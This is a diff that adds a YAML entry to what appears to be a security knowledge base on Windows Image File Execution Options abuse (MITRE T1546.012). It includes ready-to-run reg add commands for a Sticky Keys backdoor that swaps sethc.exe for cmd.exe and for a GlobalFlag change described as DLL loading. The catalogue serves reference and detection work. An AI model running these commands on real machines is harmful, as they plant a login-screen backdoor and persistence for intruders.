@@ -1,0 +1,19 @@
+name: "Image File Execution Options (IFEO)"
+description: "Registry keys that allow for the interception of process creation, often used for debugging but can be abused for persistence or privilege escalation."
+tags:
+  - persistence
+  - privilege_escalation
+  - defense_evasion
+mitre_ids:
+  - T1546.012
+keys:
+  - "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
+use_cases:
+  - title: "Sticky Keys Backdoor"
+    description: "Replaces the accessibility feature (sethc.exe) with cmd.exe, allowing system access from the login screen."
+    code: |
+      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
+  - title: "Global Flag Injection"
+    description: "Uses the GlobalFlag value to load a DLL into a process."
+    code: |
+      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v "GlobalFlag" /t REG_DWORD /d 512 /f
